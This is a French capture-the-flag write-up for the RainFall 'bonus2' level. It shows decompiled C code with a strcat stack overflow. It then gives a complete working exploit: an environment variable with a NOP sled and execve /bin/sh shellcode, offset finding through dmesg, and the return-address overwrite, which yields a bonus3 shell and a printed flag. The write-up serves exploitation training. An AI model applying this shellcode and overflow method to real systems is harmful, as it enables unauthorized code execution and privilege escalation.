Read also: [./Resources/README.md](./Resources/README.md)

https://dogbolt.org/?id=2e8bb7ea-1f7b-4c7b-a01b-0ff9afb4fc75 

# Source

```c
//----- (08048484) --------------------------------------------------------
int __cdecl greetuser(char src)
{
  __int128 dest; // [esp+10h] [ebp-48h] BYREF
  __int16 v3; // [esp+20h] [ebp-38h]
  char v4; // [esp+22h] [ebp-36h]

  switch ( language )
  {
  case 1:
    dest = xmmword_8048717;
    v3 = *((_WORD *)&xmmword_8048717 + 8);
    v4 = *((_BYTE *)&xmmword_8048717 + 18);
    break;
  case 2:
    strcpy((char *)&dest, "Goedemiddag! ");
    break;
  case 0:
    strcpy((char *)&dest, "Hello ");
    break;
  }
  strcat((char *)&dest, &src);
  return puts((const char *)&dest);
}
// 8048717: using guessed type __int128 xmmword_8048717;
// 8049988: using guessed type int language;

//----- (08048529) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[76]; // [esp+0h] [ebp-ACh] BYREF
  char dest[76]; // [esp+50h] [ebp-5Ch] BYREF
  char *v6; // [esp+9Ch] [ebp-10h]

  if ( argc != 3 )
  return 1;
  memset(dest, 0, sizeof(dest));
  strncpy(dest, argv[1], 40);
  strncpy(&dest[40], argv[2], 32);
  v6 = getenv("LANG");
  if ( v6 )
  {
  if ( !memcmp(v6, "fi", 2) )
  {
    language = 1;
  }
  else if ( !memcmp(v6, "nl", 2) )
  {
    language = 2;
  }
  }
  qmemcpy(v4, dest, sizeof(v4));
  return greetuser(v4[0]);
}
// 8049988: using guessed type int language;
// 8048529: using guessed type char dest[76];
```

# Explication

Le premier argument doit faire au maximum 40 (76 pour le buffer overflow) caractères et le deuxième 25 (40 + 15 + '\0' = 76). Sinon on a un overflow.

```
 ./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "b" * 25')
```

On va utiliser la méthode du shellcode : (On reprend notre shellcode favori)
```
export ICE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";')
```

L'adresse d'ICE est `\x17\xfe\xff\xbf`.

Quand on utilise sans gdb ça ne SEGFAULT pas au même endroit donc on va chercher l’emplacement mémoire sans gdb (supposition : apparement gdb n’utilise pas
de bloc mémoire en multiple de 16), on utilise dmesg pour récupérer la valeur d’eip/esp.

**(à tester après avoir export ICE, l'alignement mémoire n'est pas le même sinon)**

Exemple d'utilisation de `dmesg | grep segfault` pour voir les SEGFAULT :

```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "b" * 26')
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "a" * 14 + "BBBB" + "a" * 22') $(python -c 'print "b" * 26')
Hello aaaaaaaaaaaaaaBBBBaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)
bonus2@RainFall:~$ dmesg | grep segfault
[25010.142648] bonus2[7926]: segfault at 61616161 ip 61616161 sp bffff108 error 14
[25024.417468] bonus2[7932]: segfault at 42424242 ip 42424242 sp bffff108 error 14
```

En regardant le code source on sait que la taille minimale pour faire segfault est 40 et 26 (= 76).

```
./bonus2 $(python -c 'print "a" * 14 + "\x17\xfe\xff\xbf" + "a" * 22') $(python -c 'print "b" * 26')

bonus2@RainFall:~$ ./bonus2 $(python -c 'print "a" * 14 + "\x17\xfe\xff\xbf" + "a" * 22') $(python -c 'print "b" * 26')
Hello aaaaaaaaaaaaaa���aaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbb
$ whoami
bonus3
$ cat /home/user/bonus3/.pass    
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

Le flag est donc:

```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
